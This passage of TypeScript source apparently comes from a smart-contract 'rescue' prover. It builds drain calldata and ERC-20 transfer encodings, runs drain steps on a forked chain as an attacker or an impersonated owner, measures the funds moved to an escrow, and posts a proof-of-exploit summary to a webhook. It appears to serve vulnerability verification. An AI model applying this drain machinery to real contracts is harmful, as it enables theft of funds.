    else if (t === "uint[]") args.push({ kind: "uint[]", value: [] });
    else return null; // unsupported type — skip this signature
  }
  try {
    return buildAbiCalldata(sig.selector, args);
  } catch {
    return null;
  }
}

// ---- low-level calldata helpers --------------------------------------------

/**
 * Build a drain calldata using the same machinery the primary verifier
 * uses, but with the probe substituted by `addrOverride` and the bytes
 * payload by `inner`. Returns null when neither builder is applicable.
 */
function buildDrainCalldata(
  selector: string,
  argTypes: string[],
  addrPos: number | "all",
  addrOverride: string,
  inner: string,
  uintFillerDecimal: string,
): string | null {
  const filler = decimalToBigIntSafe(uintFillerDecimal);
  // Prefer the resolved-signature builder when we have argTypes.
  if (argTypes.length > 0) {
    try {
      return buildCalldataFromSignature(selector, argTypes, addrPos, addrOverride, {
        dataBytes: inner,
        uintFiller: filler,
      });
    } catch {
      // fall through
    }
  }
  // Fallback: only-selector path. We need *some* argCount estimate.
  try {
    const guessedArgCount = Math.max(typeof addrPos === "number" ? addrPos + 2 : 4, 4);
    return buildCalldataAddressAt(
      selector,
      argTypes,
      guessedArgCount,
      typeof addrPos === "number" ? addrPos : 0,
      addrOverride,
      { dataBytes: inner },
    );
  } catch {
    return null;
  }
}

function decimalToBigIntSafe(d: string): bigint {
  if (!d || d === "0") return 0n;
  try {
    return BigInt(d);
  } catch {
    return 0n;
  }
}

function encodeErc20Transfer(to: string, amount: bigint): string {
  const addr = to.replace(/^0x/, "").toLowerCase().padStart(64, "0");
  let amt = amount.toString(16);
  if (amt.length > 64) amt = amt.slice(-64);
  amt = amt.padStart(64, "0");
  return ERC20_TRANSFER_SELECTOR + addr + amt;
}

function encodeErc20TransferFrom(from: string, to: string, amount: bigint): string {
  const f = from.replace(/^0x/, "").toLowerCase().padStart(64, "0");
  const t = to.replace(/^0x/, "").toLowerCase().padStart(64, "0");
  let amt = amount.toString(16);
  if (amt.length > 64) amt = amt.slice(-64);
  amt = amt.padStart(64, "0");
  return ERC20_TRANSFER_FROM_SELECTOR + f + t + amt;
}

/** Pull the owner's address out of finding evidence. Falls back to a few
 *  known key paths the verifier uses. Returns null if no owner is known. */
function ownerAddressFromEvidence(ev: Record<string, unknown> | undefined): string | null {
  if (!ev) return null;
  const e = ev as any;
  const candidates = [
    e.attackerAddress,
    e.ownerAddress,
    e.owner?.address,
    e.ownerInfo?.address,
  ];
  for (const c of candidates) {
    if (typeof c === "string" && /^0x[0-9a-fA-F]{40}$/.test(c)) return c;
  }
  return null;
}

// ---- execution + state-diff -----------------------------------------------

async function executePlan(
  url: string,
  steps: DrainStep[],
  ownerAddr: string | null,
): Promise<PoeDrainStep[]> {
  const out: PoeDrainStep[] = [];
  for (let i = 0; i < steps.length; i++) {
    const s = steps[i];
    const valueHex = s.value === "0" ? "0x0" : "0x" + BigInt(s.value).toString(16);
    // Decide who sends the tx. "owner" executor requires an owner address
    // (verifier evidence) AND impersonation to have been enabled.
    const useOwner = s.executor === "owner" && ownerAddr;
    const fromAddr = useOwner ? ownerAddr! : ATTACKER_ADDRESS;
    try {
      const sendResult = useOwner
        ? await sendFromImpersonated(url, fromAddr, s.to, s.data, valueHex)
        : await sendFromAttacker(url, s.to, s.data, { value: valueHex });
      const success = sendResult.receipt?.status === "0x1";
      out.push({
        index: i,
        to: s.to,
        data: s.data,
        value: s.value,
        asset: s.asset,
        gasUsed: sendResult.receipt?.gasUsed ?? null,
        success: !!success,
        revertReason: success
          ? null
          : `tx ${sendResult.txHash ?? "?"} status=${sendResult.receipt?.status ?? "none"}`,
        executor: useOwner ? "owner" : "attacker",
        from: fromAddr,
        strategy: s.strategy,
      });
    } catch (err: any) {
      out.push({
        index: i,
        to: s.to,
        data: s.data,
        value: s.value,
        asset: s.asset,
        gasUsed: null,
        success: false,
        revertReason: String(err?.message ?? err).slice(0, 240),
        executor: useOwner ? "owner" : "attacker",
        from: fromAddr,
        strategy: s.strategy,
      });
    }
  }
  return out;
}

/** Send a tx FROM an impersonated address on the fork. Mirrors
 *  evm.sendFromAttacker but with the configurable `from`. */
async function sendFromImpersonated(
  url: string,
  from: string,
  to: string,
  data: string,
  valueHex: string,
): Promise<{ txHash: string; receipt: { status?: string; gasUsed?: string; blockNumber?: string } | null }> {
  const tx = {
    from,
    to,
    data,
    gas: "0x500000",
    value: valueHex,
  };
  const txHash = await rpcRequest<string>(url, "eth_sendTransaction", [tx]);
  // tiny inline receipt poll (5s) — matches evm.waitForReceipt behaviour
  const deadline = Date.now() + 8_000;
  let wait = 25;
  while (Date.now() < deadline) {
    const r = await rpcRequest<any>(url, "eth_getTransactionReceipt", [txHash]).catch(
      () => null,
    );
    if (r && r.transactionHash) return { txHash, receipt: r };
    await new Promise((res) => setTimeout(res, wait));
    wait = Math.min(250, wait * 2);
  }
  return { txHash, receipt: null };
}

interface LiveBalances {
  nativeWei: string;
  nativeUsdPerToken: number | null;
  nativeSymbol: string;
  nativeDecimals: number;
  tokens: Array<{
    address: string;
    symbol: string;
    decimals: number;
    balance: string;
    usdPerToken: number | null;
  }>;
}

async function readBalances(
  url: string,
  chainId: number,
  address: string,
  exposure: Exposure,
): Promise<LiveBalances> {
  // For tokens we already know about, read fresh balances from the fork.
  const tokens: LiveBalances["tokens"] = [];
  for (const t of exposure.tokens) {
    let bal = "0";
    try {
      const raw = await rpcRequest<string>(url, "eth_call", [
        { to: t.address, data: "0x70a08231" + address.replace(/^0x/, "").toLowerCase().padStart(64, "0") },
        "latest",
      ]);
      bal = raw && raw !== "0x" ? BigInt(raw).toString() : "0";
    } catch {
      bal = t.balance;
    }
    tokens.push({
      address: t.address,
      symbol: t.symbol,
      decimals: t.decimals,
      balance: bal,
      usdPerToken: t.usdPerToken ?? null,
    });
  }
  let nativeWei = "0";
  try {
    const hex = await rpcRequest<string>(url, "eth_getBalance", [address, "latest"]);
    nativeWei = BigInt(hex).toString();
  } catch {
    nativeWei = exposure.nativeWei;
  }
  return {
    nativeWei,
    nativeUsdPerToken: exposure.nativeUsdPerToken ?? null,
    nativeSymbol: exposure.nativeSymbol,
    nativeDecimals: exposure.nativeDecimals,
    tokens,
  };
}

function diffRescued(
  contractPre: LiveBalances,
  contractPost: LiveBalances,
  escrowPre: LiveBalances,
  escrowPost: LiveBalances,
): PoeAssetRescued[] {
  const out: PoeAssetRescued[] = [];

  const contractNativeDelta = BigInt(contractPre.nativeWei) - BigInt(contractPost.nativeWei);
  const escrowNativeDelta = BigInt(escrowPost.nativeWei) - BigInt(escrowPre.nativeWei);
  // Use escrow's gain as the source of truth (gas costs distort the contract
  // side when the attacker EOA pays gas from its funded balance).
  if (escrowNativeDelta > 0n && contractNativeDelta > 0n) {
    const amt = escrowNativeDelta < contractNativeDelta ? escrowNativeDelta : contractNativeDelta;
    const human = Number(amt) / Math.pow(10, contractPre.nativeDecimals);
    const usd =
      contractPre.nativeUsdPerToken != null && Number.isFinite(human)
        ? human * contractPre.nativeUsdPerToken
        : null;
    if (usd == null || usd >= MIN_DRAIN_USD) {
      out.push({
        token: null,
        amountBase: amt.toString(),
        symbol: contractPre.nativeSymbol,
        decimals: contractPre.nativeDecimals,
        usdValue: usd,
      });
    }
  }

  const preTokens = new Map(contractPre.tokens.map((t) => [t.address.toLowerCase(), t]));
  const postTokens = new Map(contractPost.tokens.map((t) => [t.address.toLowerCase(), t]));
  const escrowPostTokens = new Map(escrowPost.tokens.map((t) => [t.address.toLowerCase(), t]));
  const escrowPreTokens = new Map(escrowPre.tokens.map((t) => [t.address.toLowerCase(), t]));

  for (const [addr, pre] of preTokens) {
    const post = postTokens.get(addr);
    const escPre = escrowPreTokens.get(addr);
    const escPost = escrowPostTokens.get(addr);
    const contractDelta = BigInt(pre.balance) - BigInt(post?.balance ?? "0");
    const escrowDelta = BigInt(escPost?.balance ?? "0") - BigInt(escPre?.balance ?? "0");
    if (contractDelta > 0n && escrowDelta > 0n) {
      const amt = escrowDelta < contractDelta ? escrowDelta : contractDelta;
      const human = Number(amt) / Math.pow(10, pre.decimals);
      const usd =
        pre.usdPerToken != null && Number.isFinite(human) ? human * pre.usdPerToken : null;
      if (usd != null && usd < MIN_DRAIN_USD) continue;
      out.push({
        token: addr,
        amountBase: amt.toString(),
        symbol: pre.symbol,
        decimals: pre.decimals,
        usdValue: usd,
      });
    }
  }
  return out;
}

function drainedEverything(pre: LiveBalances, post: LiveBalances): boolean {
  if (BigInt(post.nativeWei) > 0n) return false;
  for (const p of post.tokens) {
    if (BigInt(p.balance) > 0n) return false;
  }
  // also requires that pre had something
  if (BigInt(pre.nativeWei) === 0n && pre.tokens.every((t) => t.balance === "0")) return false;
  return true;
}

function snapStateFromLive(s: LiveBalances): PoeArtifact["preState"] {
  const nativeHuman = Number(s.nativeWei) / Math.pow(10, s.nativeDecimals);
  const nativeUsd =
    s.nativeUsdPerToken != null && Number.isFinite(nativeHuman)
      ? nativeHuman * s.nativeUsdPerToken
      : null;
  return {
    nativeWei: s.nativeWei,
    nativeUsd,
    tokens: s.tokens.map((t) => {
      const human = Number(t.balance) / Math.pow(10, t.decimals);
      const usdValue =
        t.usdPerToken != null && Number.isFinite(human) ? human * t.usdPerToken : null;
      return {
        address: t.address,
        symbol: t.symbol,
        decimals: t.decimals,
        balance: t.balance,
        usdValue,
      };
    }),
  };
}

function snapState(exp: Exposure): PoeArtifact["preState"] {
  const nativeHuman = Number(exp.nativeWei) / Math.pow(10, exp.nativeDecimals);
  const nativeUsd =
    exp.nativeUsdPerToken != null && Number.isFinite(nativeHuman)
      ? nativeHuman * exp.nativeUsdPerToken
      : null;
  return {
    nativeWei: exp.nativeWei,
    nativeUsd,
    tokens: exp.tokens.map((t) => ({
      address: t.address,
      symbol: t.symbol,
      decimals: t.decimals,
      balance: t.balance,
      usdValue: t.usdValue ?? null,
    })),
  };
}

function emptyState(): PoeArtifact["preState"] {
  return { nativeWei: "0", nativeUsd: null, tokens: [] };
}

// ---- finalise + persist + notify ------------------------------------------

interface FinaliseArgs {
  attemptId: string;
  input: RescueProveInput;
  verdict: PoeVerdict;
  assets: PoeAssetRescued[];
  plan: PoeDrainStep[];
  pre: PoeArtifact["preState"];
  post: PoeArtifact["postState"];
  notes: string[];
  blockNumber: number | null;
  error: string | null;
  startedAt: number;
  /** Owner address impersonated on the fork (if any). Surfaced in the PoE
   *  so the broadcaster knows whether ownerKey access is required to
   *  reproduce the rescue against mainnet. */
  executorOwner: string | null;
}

function finalise(args: FinaliseArgs): PoeArtifact {
  const ev = (args.input.evidence ?? {}) as any;
  const attackerKindRaw = ev.attackerKind ?? "unknown";
  const attackerKind: PoeArtifact["attackerKind"] =
    attackerKindRaw === "any" || attackerKindRaw === "owner" ? attackerKindRaw : "unknown";

  const totalUsd =
    args.assets.length === 0
      ? null
      : args.assets.reduce((acc, a) => (a.usdValue != null ? acc + a.usdValue : acc), 0) || null;

  const poe: PoeArtifact = {
    attemptId: args.attemptId,
    findingId: args.input.findingId,
    chainId: args.input.chainId,
    contractAddress: args.input.contractAddress.toLowerCase(),
    attackerKind,
    executorOwner: args.executorOwner ? args.executorOwner.toLowerCase() : null,
    escrowAddress: DEFAULT_ESCROW.toLowerCase(),
    attackerEoa: ATTACKER_ADDRESS.toLowerCase(),
    verdict: args.verdict,
    blockNumber: args.blockNumber,
    rescuedAssets: args.assets,
    drainPlan: args.plan,
    totalRescuedUsd: totalUsd,
    preState: args.pre,
    postState: args.post,
    notes: args.notes,
    engine: ENGINE_ID,
    engineVersion: ENGINE_VERSION,
    createdAt: Date.now(),
    durationMs: Date.now() - args.startedAt,
    error: args.error,
  };
  try {
    persistPoe(poe);
    logRescueAction({
      findingId: poe.findingId,
      attemptId: poe.attemptId,
      kind: "poe-generated",
      detail: {
        verdict: poe.verdict,
        rescuedAssets: poe.rescuedAssets.length,
        totalRescuedUsd: poe.totalRescuedUsd,
      },
    });
  } catch (e) {
    console.warn("[rescue-prove] failed to persist PoE", e);
  }
  if (poe.verdict === "true_positive_drained" || poe.verdict === "true_positive_partial") {
    // Notify asynchronously — never block the prover on a slow webhook.
    void notifyRescueWebhook(poe).catch(() => null);
  }
  return poe;
}

// ---- TG/webhook notify -----------------------------------------------------

async function notifyRescueWebhook(poe: PoeArtifact): Promise<void> {
  const summary = {
    type: "rescue.poe",
    findingId: poe.findingId,
    chainId: poe.chainId,
    contractAddress: poe.contractAddress,
    verdict: poe.verdict,
    totalRescuedUsd: poe.totalRescuedUsd,
    rescuedCount: poe.rescuedAssets.length,
    escrow: poe.escrowAddress,
    blockNumber: poe.blockNumber,
    poeUrl: `/api/proofs/${poe.findingId}/poe.json`,
    createdAt: poe.createdAt,
  };

  // 1. In-process TG bot (skipped silently when TG_BOT_TOKEN unset).
  try {
    const { notifyPoe } = await import("../rescue/tg-bot");
    await notifyPoe({
      findingId: poe.findingId,
      chainId: poe.chainId,
      contractAddress: poe.contractAddress,
      verdict: poe.verdict,
      totalRescuedUsd: poe.totalRescuedUsd,
      rescuedCount: poe.rescuedAssets.length,
      escrow: poe.escrowAddress,
      blockNumber: poe.blockNumber,
    });
  } catch (err) {
    console.warn("[rescue-prove] tg notify failed", err);
  }

  // 2. Generic outbound webhook (for users who want to plug another bot,
  //    Slack/Discord/whatever — they hit /api/proofs/[id]/poe.json themselves).
  if (NOTIFY_URL) {
    const ac = new AbortController();
    const t = setTimeout(() => ac.abort(), NOTIFY_TIMEOUT_MS);
    try {
      await fetch(NOTIFY_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(summary),
        signal: ac.signal,
      });
      logRescueAction({
        findingId: poe.findingId,
        attemptId: poe.attemptId,
        kind: "tg-notified",
        detail: { url: NOTIFY_URL, ok: true },
      });
    } catch (err) {
      logRescueAction({
        findingId: poe.findingId,
        attemptId: poe.attemptId,
        kind: "tg-notified",
        detail: { url: NOTIFY_URL, ok: false, error: String((err as any)?.message ?? err) },
      });
    } finally {
      clearTimeout(t);
    }
  }
}
